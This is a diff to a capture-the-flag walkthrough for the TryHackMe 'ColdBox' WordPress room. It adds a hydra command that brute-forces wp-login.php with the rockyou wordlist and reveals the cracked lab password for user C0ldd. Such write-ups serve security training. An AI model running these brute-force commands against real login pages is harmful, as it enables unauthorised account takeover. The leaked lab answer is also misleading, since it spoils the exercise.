@@ -1,6 +1,10 @@
 # ColdBox
 
+<div align="left">
+
 <figure><img src=".gitbook/assets/image.png" alt="" width="168"><figcaption><p><a href="https://tryhackme.com/room/colddboxeasy">https://tryhackme.com/room/colddboxeasy</a></p></figcaption></figure>
+
+</div>
 
 🔗 [ColdBox](https://tryhackme.com/room/colddboxeasy)
 
@@ -113,16 +117,24 @@ Finally the's another good info
 
 <figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-we can try to login with C0ldd/Hugo/Philip:password123 (what we've see in the hidden path), but they don't work.
+If we don't waste time, we can use wpscan to find user list, but we'll take it if we take results with our three users, then try to login with C0ldd/Hugo/Philip:password123 (what we've see in the hidden path).
 
-Then, we save them in a file called user.txt, and run hydra with a password wordlist to take a brute force attack:
+Nothing to do, we need to use brute force attack.
+
+Then, we save them in a file called users.txt, and run hydra with a password wordlist to take a brute force attack:
 
 ```bash
-echo "C0ldd\nHugo\n\nPhilip" > user.txt
-hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 10.10.100.105 ssh -s 4512 #with -s flag we specify non default port
+echo "C0ldd\nHugo\nPhilip" > users.txt
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt coldbox.thm -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 ```
 
+<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
 
+{% hint style="info" %}
+C0ldd:9876543210
+{% endhint %}
+
+Now we can use this credentials to log in wordpress and ssh.
 
 
 
